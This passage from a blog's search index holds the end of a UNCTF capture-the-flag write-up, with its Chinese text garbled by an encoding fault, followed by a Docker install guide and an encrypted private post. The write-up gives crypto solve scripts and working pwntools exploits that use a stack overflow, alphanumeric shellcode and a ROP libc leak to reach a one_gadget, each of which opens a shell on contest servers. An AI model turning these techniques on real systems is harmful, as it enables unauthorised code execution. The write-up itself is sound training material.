äº†ï¼Œï¼Œ</p><p>é‚£ä¹ˆç›´æ¥ä¸ŠVçˆ·çˆ·è„šæœ¬</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">def n2s(num):</span><br><span class="line">    t = hex(num)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> len(t) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">       <span class="keyword">return</span> (<span class="string">'0'</span>+t).decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">return</span> t.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">def decode(c):</span><br><span class="line">    p = <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">    q = <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">    n = p*q</span><br><span class="line">    r = <span class="keyword">pow</span>(c,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">    s = <span class="keyword">pow</span>(c,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">    a = gmpy2.invert(p,q)</span><br><span class="line">    b = gmpy2.invert(q,p)</span><br><span class="line">    x =(a*p*s+b*q*r)%n</span><br><span class="line">    y =(a*p*s-b*q*r)%n</span><br><span class="line">    <span class="keyword">print</span> n2s(x%n)</span><br><span class="line">    <span class="keyword">print</span> n2s((-x)%n)</span><br><span class="line">    <span class="keyword">print</span> n2s(y%n)</span><br><span class="line">    <span class="keyword">print</span> n2s((-y)%n)</span><br><span class="line"></span><br><span class="line">c1=<span class="number">62501276588435548378091741866858001847904773180843384150570636252430662080263</span></span><br><span class="line"></span><br><span class="line">c2=<span class="number">72510845991687063707663748783701000040760576923237697638580153046559809128516</span></span><br><span class="line"></span><br><span class="line">decode(c1)</span><br><span class="line">decode(c2)</span><br></pre></td></tr></table></figure><p><a href="https://p4.ssl.qhimg.com/t01ddf73d4040ed8c6f.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01ddf73d4040ed8c6f.png" alt="img"></a></p><p>è¿è¡Œå¾—åˆ°flagï¼šunctf{412a1ed6d21e55191ee5131f266f5178}</p><h3 id="ECCå’ŒAESåŸºç¡€"><a href="#ECCå’ŒAESåŸºç¡€" class="headerlink" title="ECCå’ŒAESåŸºç¡€"></a>ECCå’ŒAESåŸºç¡€</h3><p>å‚è€ƒ<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/discrete-log/ecc-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/discrete-log/ecc-zh/</a></p><p>å°†åº•ä¸‹çš„è„šæœ¬çš„æ•°æ®æ›¿æ¢ä¸‹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">G</span>=E(6478678675, 5636379357093)</span><br><span class="line">pub = E(2854873820564,9226233541419)</span><br><span class="line"></span><br><span class="line">c1 = E(6860981508506,1381088636252)</span><br><span class="line">c2 = E(1935961385155, 8353060610242)</span><br><span class="line"></span><br><span class="line">X = G</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1, 3000000):</span><br><span class="line">    <span class="keyword">if</span> X == pub:</span><br><span class="line">       <span class="built_in"> secret </span>= i</span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">"[+] secret:"</span>, i</span><br><span class="line">        break</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        X = X + G</span><br><span class="line">        <span class="builtin-name">print</span> i</span><br><span class="line"></span><br><span class="line">m = c2 - (c1 * secret)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"[+] x:"</span>, m[0]</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"[+] y:"</span>, m[1]</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"[+] x+y:"</span>, m[0] + m[1]</span><br></pre></td></tr></table></figure><p>çˆ†ç ´å¾—åˆ°secret=2019813</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">x</span>=1559343440829</span><br><span class="line"> <span class="attribute">y</span>=7468915163961</span><br></pre></td></tr></table></figure><p>xå³ä¸ºaes_key</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">from</span> <span class="type">Crypto</span>.<span class="type">Cipher</span> <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title">key</span> = bytes('<span class="number">1559343440829</span>'.ljust(<span class="number">16</span>,' '))</span><br><span class="line"><span class="title">aes</span> = <span class="type">AES</span>.new(key, <span class="type">AES</span>.<span class="type">MODE_ECB</span>)  </span><br><span class="line"><span class="class"><span class="keyword">data</span>=base64.b64decode('/<span class="title">cM8Nx</span>+<span class="title">iAidmt6RiqX8Vww</span>==')</span></span><br><span class="line"><span class="title">ans</span> = aes.decrypt(<span class="class"><span class="keyword">data</span>)</span></span><br><span class="line"><span class="title">print</span> ans</span><br></pre></td></tr></table></figure><p>å‘ç°å¹¶ä¸èƒ½è§£å‡ºæ¥</p><p>è¿™é‡Œæœ‰ç‚¹å°å‘ï¼ŒC1å’ŒC2ä½ç½®äº’æ¢äº†</p><p>äºæ˜¯é‡æ–°è·‘ç¬¬ä¸€ä¸ªè„šæœ¬ï¼ŒC1å’ŒC2çš„å€¼äº’æ¢ï¼Œsecretä¹‹å‰å·²ç»çˆ†ç ´å‡ºæ¥äº†</p><p>å¾—åˆ° x=1026</p><p>AESè§£å¯†å¾—</p><p>thisisa_flag</p><p>ç„¶åå»ç›®æ ‡url post</p><p>å¾—åˆ°</p><p><a href="https://p0.ssl.qhimg.com/t017274e33bae69e881.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t017274e33bae69e881.png" alt="img"></a></p><p>flagï¼š401E48C9A96DC219C32AB5E75204B655</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Sosoeasypwn"><a href="#Sosoeasypwn" class="headerlink" title="Sosoeasypwn"></a>Sosoeasypwn</h3><p>åŸæœ¬æƒ³æ³„éœ²canaryï¼Œåæ— æ„é—´å‘ç°ï¼Œeipç«Ÿç„¶è¢«è¦†ç›–äº†ï¼Œäºæ˜¯æ‰‹æµ‹ï¼Œå‘ç°è¾“å…¥12ä¸ªaåå³å¯æ§åˆ¶eipã€‚ï¼ˆè¿™é‡Œè¾“å…¥äº†12ä¸ªaå’Œ3ä¸ªbåŠ 1ä¸ªå›è½¦ï¼Œå¯è§eipè¢«è¦†ç›–æˆäº†bbb\nï¼‰</p><p><a href="https://p4.ssl.qhimg.com/t010c37e6c8bbb1b6b1.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t010c37e6c8bbb1b6b1.png" alt="img"></a></p><p>IDAé™æ€åˆ†æå‘ç°ï¼Œæ˜¯ä¸¤ä¸ªå‡½æ•°è°ƒç”¨äº†åŒä¸€ä¸ªæ ˆï¼Œç„¶åæ ˆå†…æ•°æ®æ²¡æ¸…ç†ï¼Œå¯¼è‡´éƒ¨åˆ†æ•°æ®è¢«é‡ç”¨</p><p><a href="https://p4.ssl.qhimg.com/t015e095d24737ad464.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t015e095d24737ad464.png" alt="img"></a></p><p>æ‰€ä»¥å¯¼è‡´åˆæ³•è¾“å…¥å°±å¯ä»¥è¦†ç›–v1çš„å€¼ã€‚</p><p>ç”±äºå¼€å¯äº†eipä¿æŠ¤ï¼Œä½†ç¨‹åºæœ¬èº«å·²ç»ç»™äº†16ä½ï¼ˆ4ä¸ªå­—ç¬¦ï¼‰ï¼Œidaé‡Œå¯ä»¥çœ‹åˆ°åé—¨å‡½æ•°çš„ç›¸å¯¹åç§»ï¼Œ9CD</p><p><a href="https://p3.ssl.qhimg.com/t018a621e2f9cea22b6.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t018a621e2f9cea22b6.png" alt="img"></a></p><p><a href="https://p4.ssl.qhimg.com/t0196029343f5794798.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t0196029343f5794798.png" alt="img"></a></p><p>åŸºå€å12ä½ï¼ˆ3ä¸ªå­—ç¬¦ï¼‰éƒ½æ˜¯0ï¼Œé‚£ä¹ˆä»…éœ€è¦çˆ†ç ´ä¸€ä¸ªå­—ç¬¦å³å¯å¾—åˆ°æ‹¿åˆ°shell</p><p>expï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/<span class="keyword">python</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                </span><br><span class="line">                #sh = remote(<span class="string">'101.71.29.5'</span>,<span class="number">10000</span>)</span><br><span class="line">                <span class="keyword">sh</span> = process(<span class="string">"./pwn"</span>)</span><br><span class="line">              base_addr = <span class="keyword">sh</span>.recvuntil(<span class="string">' world'</span>)</span><br><span class="line">              base_addr = hex(<span class="keyword">int</span>(base_addr[-<span class="number">11</span>:-<span class="number">6</span>]))</span><br><span class="line">              <span class="keyword">sh</span>.recvuntil(<span class="string">'So, Can you tell me your name?'</span>)</span><br><span class="line">              <span class="keyword">sh</span>.send(<span class="string">'a'</span>*<span class="number">12</span>+p32(<span class="keyword">int</span>(base_addr+<span class="string">'89cd'</span>,<span class="number">16</span>))</span><br><span class="line">              <span class="keyword">sh</span>.recvuntil(<span class="string">'Please'</span>)</span><br><span class="line">              <span class="keyword">sh</span>.sendline(<span class="string">'ls'</span>)</span><br><span class="line">              <span class="keyword">sh</span>.interactive()</span><br><span class="line"></span><br><span class="line">       except Exception <span class="keyword">as</span> <span class="keyword">e</span>:</span><br><span class="line">                <span class="keyword">sh</span>.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure><p><a href="https://p3.ssl.qhimg.com/t01c1ca90119886610c.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01c1ca90119886610c.png" alt="img"></a></p><p>å¾—åˆ°flagï¼šUNCTF{S0soE4zy_Pwn}</p><h3 id="EasyShellcode"><a href="#EasyShellcode" class="headerlink" title="EasyShellcode"></a>EasyShellcode</h3><p>åæ±‡ç¼–çœ‹ç¨‹åºé€»è¾‘ï¼Œå°±åªæ˜¯é™åˆ¶äº†shellcodeçš„å­—ç¬¦ï¼Œè¦æ±‚åœ¨A-Za-z0-9ä¹‹é—´</p><p>ç›´æ¥ä¸ŠVçˆ·çˆ·å°†shellcodeè½¬base64çš„å·¥å…·</p><p><a href="https://github.com/veritas501/ae64" target="_blank" rel="noopener">https://github.com/veritas501/ae64</a></p><p>expï¼š</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'101.71.29.5'</span>,<span class="number">10080</span>)</span><br><span class="line">p.recvuntil(<span class="string">'say?\n'</span>)</span><br><span class="line">obj = AE64()</span><br><span class="line">sc = obj.encode(asm(shellcraft.sh()))</span><br><span class="line">p.sendline(sc)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://p5.ssl.qhimg.com/t0179595b6b28cd5641.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t0179595b6b28cd5641.png" alt="img"></a></p><p>flagï¼šUNCTF{x64A5c11shE11c0dEi550_Ea5y}</p><h3 id="easy-rop"><a href="#easy-rop" class="headerlink" title="easy rop"></a>easy rop</h3><p><a href="https://p2.ssl.qhimg.com/t01759f7cce9c0eaea9.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>è¿™ä¸ªå¾ˆå¥½ç»•è¿‡</p><p><a href="https://p3.ssl.qhimg.com/t013871b803b0d0c557.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t013871b803b0d0c557.png" alt="img"></a></p><p>å‘ç°æœ‰ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œè€Œä¸”retaddråšäº†é™åˆ¶ï¼Œè¿™æ ·å°±ä¸èƒ½ç›´æ¥retåˆ°systemäº†ï¼ˆè¿™é‡Œæˆ‘ç”¨çš„æ˜¯one_gadgetï¼‰ï¼Œä½†æ˜¯å¯ä»¥æ‰¾gadgetç»•è¿‡ï¼ˆè¿™é‡Œæˆ‘æ‰¾çš„æ˜¯ ret ï¼‰</p><p>å…¶ä¸­libcç‰ˆæœ¬ç”¨LibcSearcheræ³„éœ²å‡ºæ¥ï¼Œç„¶åpayloadçš„åç§»éœ€è¦ç”¨â€™\x00â€™æ¥å¡«å……ï¼Œä»¥æ»¡è¶³one_gadgetçš„æ¡ä»¶ã€‚</p><p><a href="https://p3.ssl.qhimg.com/t01ce2f71ec4f2627f1.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01ce2f71ec4f2627f1.png" alt="img"></a></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#sh = process('./babyrop')</span></span><br><span class="line">sh = remote(<span class="string">'101.71.29.5'</span>,<span class="number">10041</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babyrop'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main_addr = <span class="number">0x08048592</span></span><br><span class="line">ret = <span class="number">0x0804839e</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Hello CTFer!'</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x20</span> + p32(<span class="number">0x66666666</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'name?\n'</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x14</span>  + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">addr = u32(sh.recvuntil(<span class="string">'\xf7'</span>)[<span class="number">-5</span>:])</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,addr)</span><br><span class="line">base = addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = base + <span class="number">0x3a819</span></span><br><span class="line"><span class="comment">#one_gadget = base + 0x3ac69</span></span><br><span class="line">sh.recvuntil(<span class="string">'Hello CTFer!'</span>)</span><br><span class="line">payload = p32(<span class="number">0</span>)*<span class="number">8</span> + p32(<span class="number">0x66666666</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'name?\n'</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x14</span> + p32(ret) +p32(one_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®‰è£…Docker å’Œ Docker-Composeä»¥åŠdocker imagesçš„åˆ¶ä½œåŠä¸Šä¼ </title>
      <link href="/2019/11/01/docker%E5%92%8Cdocker-compose%E7%9A%84%E5%AE%89%E8%A3%85/"/>
      <url>/2019/11/01/docker%E5%92%8Cdocker-compose%E7%9A%84%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h3 id="å®‰è£…Docker-å’Œ-Docker-Composeã€‚"><a href="#å®‰è£…Docker-å’Œ-Docker-Composeã€‚" class="headerlink" title="å®‰è£…Docker å’Œ Docker-Composeã€‚"></a>å®‰è£…Docker å’Œ Docker-Composeã€‚</h3><p>Dockerï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -<span class="keyword">y</span> yum-utils device-mapper-persistent-data lvm2</span><br><span class="line"></span><br><span class="line">sudo yum-config-manager --<span class="built_in">add</span>-repo http<span class="variable">s:</span>//download.docker.<span class="keyword">com</span>/linux/centos/docker-<span class="keyword">ce</span>.repo</span><br><span class="line"></span><br><span class="line">sudo yum install docker-<span class="keyword">ce</span> docker-<span class="keyword">ce</span>-cli containerd.io</span><br><span class="line"></span><br><span class="line">yum <span class="keyword">list</span> docker-<span class="keyword">ce</span> --showduplicates | <span class="keyword">sort</span> -r</span><br><span class="line"></span><br><span class="line">sudo yum install docker-<span class="keyword">ce</span>-<span class="symbol">&lt;VERSION_STRING&gt;</span> docker-<span class="keyword">ce</span>-cli-<span class="symbol">&lt;VERSION_STRING&gt;</span> containerd.io</span><br><span class="line"><span class="keyword">e</span>.<span class="variable">g:</span></span><br><span class="line">sudo yum install docker-<span class="keyword">ce</span>-docker-<span class="keyword">ce</span>-<span class="number">18.09</span>.<span class="number">1</span> docker-<span class="keyword">ce</span>-cli-docker-<span class="keyword">ce</span>-<span class="number">18.09</span>.<span class="number">1</span> containerd.io</span><br><span class="line"></span><br><span class="line">sudo systemctl start docker</span><br><span class="line"></span><br><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure><p>Docker-Compose</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">install</span> python-pip</span><br><span class="line">pip <span class="keyword">install</span> <span class="comment">--upgrade pip</span></span><br><span class="line">pip <span class="keyword">install</span> <span class="comment">--upgrade setuptools</span></span><br><span class="line">pip <span class="keyword">install</span> more-itertools==<span class="number">5.0</span><span class="number">.0</span></span><br><span class="line">pip <span class="keyword">install</span> docker-compose</span><br></pre></td></tr></table></figure><h3 id="docker-imagesçš„åˆ¶ä½œåŠä¸Šä¼ "><a href="#docker-imagesçš„åˆ¶ä½œåŠä¸Šä¼ " class="headerlink" title="docker imagesçš„åˆ¶ä½œåŠä¸Šä¼ "></a>docker imagesçš„åˆ¶ä½œåŠä¸Šä¼ </h3><h4 id="åˆ¶ä½œ"><a href="#åˆ¶ä½œ" class="headerlink" title="åˆ¶ä½œ"></a>åˆ¶ä½œ</h4><p>dockerfileå•¥çš„æ–‡ä»¶å¾—å…ˆå‡†å¤‡å¥½~</p><p>ç„¶åè¿›å…¥åˆ°æœ‰docker-compose.ymlæ–‡ä»¶çš„ç›®å½•</p><p><code>docker build -t ID/repo:tag ./</code></p><p>æ¯”å¦‚</p><p><code>docker build -t jayxv/dockerfiles:web1 ./</code></p><p>æŸ¥çœ‹ç¡®è®¤</p><p><code>docker images</code></p><h4 id="ç™»é™†dockerhub"><a href="#ç™»é™†dockerhub" class="headerlink" title="ç™»é™†dockerhub"></a>ç™»é™†dockerhub</h4><p><code>docker login</code></p><h4 id="ä¸Šä¼ è‡³dockerhub"><a href="#ä¸Šä¼ è‡³dockerhub" class="headerlink" title="ä¸Šä¼ è‡³dockerhub"></a>ä¸Šä¼ è‡³dockerhub</h4><p><code>docker push jayxv/dockerfiles:web1</code>ï¼ˆç¡®ä¿imageçš„IDå’Œä»“åº“åä¸ä½ çš„dockerhubä¸Šçš„è´¦æˆ·åä¸€è‡´~ï¼‰</p><h4 id="æ‹‰åˆ°æœ¬åœ°"><a href="#æ‹‰åˆ°æœ¬åœ°" class="headerlink" title="æ‹‰åˆ°æœ¬åœ°"></a>æ‹‰åˆ°æœ¬åœ°</h4><p><code>docker pull jayxv/dockerfiles:web1</code></p><h3 id="è¿è¡Œdocker"><a href="#è¿è¡Œdocker" class="headerlink" title="è¿è¡Œdocker"></a>è¿è¡Œdocker</h3><p>docker run -d -p 9999:9999 jayxv/dockerfiles:web1</p><h3 id="è¿›å…¥docker"><a href="#è¿›å…¥docker" class="headerlink" title="è¿›å…¥docker"></a>è¿›å…¥docker</h3><p>docker exec -it å®¹å™¨id /bin/sh </p><h3 id="å¯¼å‡ºé•œåƒ"><a href="#å¯¼å‡ºé•œåƒ" class="headerlink" title="å¯¼å‡ºé•œåƒ"></a>å¯¼å‡ºé•œåƒ</h3><p> docker save &gt; web1.tar jayxv/dockerfiles:web1</p><h3 id="å¯¼å…¥é•œåƒ"><a href="#å¯¼å…¥é•œåƒ" class="headerlink" title="å¯¼å…¥é•œåƒ"></a>å¯¼å…¥é•œåƒ</h3><p>docker load &lt;  web1.tar</p>]]></content>
      
      
      <categories>
          
          <category> å·¥å…·å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¯æŸä¸ªå¤±çœ çš„å¤œæ™š</title>
      <link href="/2019/10/01/%E6%98%AF%E6%9F%90%E4%B8%AA%E5%A4%B1%E7%9C%A0%E7%9A%84%E5%A4%9C%E6%99%9A/"/>
      <url>/2019/10/01/%E6%98%AF%E6%9F%90%E4%B8%AA%E5%A4%B1%E7%9C%A0%E7%9A%84%E5%A4%9C%E6%99%9A/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="ç§äººå°å±‹çš„ä¸œè¥¿ä¸ç»™ä½ ä»¬çœ‹ï¼Œèµ°å¼€èµ°å¼€~" />    <label for="hbePass">ç§äººå°å±‹çš„ä¸œè¥¿ä¸ç»™ä½ ä»¬çœ‹ï¼Œèµ°å¼€èµ°å¼€~</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="8906a27778a34005809a371228b1d90ad15fa59727e74c69c833defbf21a7398">d23517531efec1414f92456cdfc9e2ffba1379fc6246e0bd004df572bef5da2d8113da67bb4352ce1f671e21ba70bae5466719f1c7c5e0f79d0609d0b4c1614245d579bcad7fa451d4f5ad21ea4555b63f8ad15c22530781cf8e8617b4573e740b01b24b1c672e58cb6619a7da4014d6ddda64b22c5a3e1b6bfcede4409f690d07de654173fc493d35af306797c22eb8e9ae56961401db83b4d596ddba9c5ccb5aa364b81c24c654873ff7acabcd4fa253d9d131d08805e6af6afd6f6a4aece7675206690ab0b324c27577a5a44163972d393dba601f38f29ec52d115ee59970f43283cafc2e07c2734c66278a62fb441d79a85f1e8560c16bcd160e70c014d192fc441f76f4da80ab1f2540c257a37442434cb4cf6626b3943c2fe9462375b888e7d05438622939cc35942b255e4c17343efa447db3bdcc0e0035dbd9393e31a745c0365525618bb475fa904b605d773323ae3f569cf48244fea5e7d6ca2939cca5d6bfd8897160ee7b48f9c6e81236c3ad72ad18de3c799bf72f3bce6a75cd28636ba65165c88580cd52d202901dcf9dc951f45d5f7fc754a115f6be130614e58e2c65c82079cd16fb0f16039c85c3cbd307913f7e141e2d258f11c4048c43c631f02cf2ee4c6f0ff39d84523be67cc1dd3c54b49c38019a787b4ea55d68479dc2da6a1ce2292943d0d08fdbfb7d4bd73449299cd91f328993bff06fa711ac381a564d919d8e7d8a93d013c3cf28fc51dfc7d1907c764c5c0763499be58c92ab6a7fbf10d92b773c1e4a80e01588e9e243957f1cf6f30e716de451625dbefb8b821573aab6d1fcf4d7df05f021db583fc2308b136719469553172549cfdf15410d66f2b8c9c15372ec2686b6d71af47d029af64636545f9724fd30f61a2d0e16bf0f7a4c588f335bea894393c34715d07a54a58820c5a13a7f5e1653a58d501c355eb669b1f1af3e9bc96960656c299f083cfbdace246c92f1337d23fd69a386424e2a8d3e4001c97915376f9ae478e04561b8cc2c12fda7d8cc8ffb220c9124f601e7ce51a3a7e2ee362b3f603ad9caf9b97a73c7ac245be0ee31f20da7b273cd7f7b1c73b227502c3a6683f83f796cbc05973f540da9c85e2e73b3465964bda8891d6e8fd72c958a3eaa09a1c845352d6e87cdc73af76813b665bb694e727cb0c935ddd47515a2ed28fe08ae03d49e011695c958443e046050f46aad796a18f712da769b3c6713a9b4fad8dea9a9dec19c0108805a4541a12d9b4662e6726f2b2f973eb8ccdb7bfcaeb7ab9f6d7cfedbfbda27a325895ea3205759221bd6824bd6b6f731126483084bc3097a4c0870be274fff5b3b7ead1df6f6f7beb9fe08620ad1b2a8958c5d019846a51902202866fd3007cc68e79689f6d0c331a85351e508ec3edf36b696d6cfd14964f5820c1b0024c8fc36f3df3a4a1080abbcb9c8f395fdd9d86c535a7f3743efdd7eecd916ce2d7f000f97956d08c57439ef3beeee68f643f83e75639e217f1b893a8fb41b74df9b262cc3ef3f119ee53eca6c24453c38d95c393c1b3c6b57b44a3b904327c00bfbab829dd76c9bd17f7315352475a31c9f5489c40f1096a0b26c5c221ca63a9e379f63aa2bfad77f35aa9c34b24aeae96498e96eceb1168d6f5974f83b9b43b777d90a94124a172b536f89da574b416175f77bbcff5946ff8c06ad14969da3c621c010950e6c0684f9112a2422e4263d641e17a7d6a6ccaf954bebf350f9662c51b7ba3c8ab57c967c5fb111b55867e5d61a8bd73645f0e11598b762fb8f133d9c1bc51a9d8eb4ecfdbc0b8d389366b54e0bbfa7f039cf504fb7d8d99d1c3d3171cafd0e6e39fd0c3fc54914b3c99af160953cba9088dba06a4c28c10534af525336961c2e0b2c4aa326abdc37a439da3488bb9ff2e75fda0f17f60c7ec41095a2f062af56841aca54ca1dfcfe028d36c6320b5bee4607c2a39cf4e4cf12da3096bde075e266155235e673659ebffe8ac8700485d09ddc878cc0dbddf072598cc7756fd2ff2cb19780fe7986da90668a03a61e0ecece51fa9880da1aa8f0686bc40c85d40c0c067e6